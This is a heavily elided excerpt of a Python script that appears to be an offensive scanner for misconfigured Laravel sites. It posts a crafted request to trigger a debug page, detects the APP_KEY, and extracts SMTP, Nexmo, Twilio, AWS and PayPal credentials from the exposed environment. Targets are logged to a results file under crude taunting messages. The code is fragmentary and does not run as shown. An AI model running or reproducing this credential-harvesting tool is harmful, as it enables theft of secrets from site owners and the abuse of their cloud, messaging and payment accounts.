                        ...
                        if "AWS_ACCESS_KEY_ID" in text:
                                if "AWS_ACCESS_KEY_ID=" in text:
                                        ...
                                        try:
                                                ...
                                                aws_sec = ''
                                        try:
                                                bl4nk = m0b0().get_aws_region(text)
                                                if bl4nk:
                                                        aws_reg = bl4nk
                                                else:
                                                        aws_reg = ''
...
def main(url):
        ...
        try:
                ...
                if "APP_KEY=" in get_source:
                        ...
                        get_source = requests.post(url, data={"0x[]":"m0b0"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                        if "<td>APP_KEY</td>" in get_source:
                                resp = get_source
                if resp:
                        getsmtp = m0b0().get_smtp(resp, url)
                        getnexmo = m0b0().get_nexmo(resp, url)
                        getwtilio = m0b0().get_twillio(resp, url)
                        getaws = m0b0().get_aws_data(resp, url)
                        getpp = m0b0().paypal(resp, url)
                        if getsmtp:
                        ...
                        text += ' | \033[31;1mFvck Nothing\033[0m'
                        save = open('Results/not_vulnerable.txt','a')
                        bl4nk = str(url).replace('\r', '')
                        save.write(bl4nk+'\n')
                        save.close()
        except:
        ...
        try:
                ...
                try:
                        ...
                        try:
                                ...
                                print("Check Your Fvcking File DUD")
                                exit()
                        try:
